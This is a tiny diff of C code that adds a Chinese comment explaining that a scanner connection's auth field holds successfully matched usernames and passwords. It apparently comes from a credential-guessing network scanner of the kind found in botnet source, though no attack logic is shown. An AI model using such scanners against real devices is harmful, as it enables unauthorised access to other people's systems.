@@ -23,7 +23,7 @@ struct scanner_auth {
 };
 
 struct scanner_connection {
-    struct scanner_auth *auth;
+    struct scanner_auth *auth;//匹配成功的用户名和密码等信息
     int fd, last_recv;
     enum {
         SC_CLOSED,
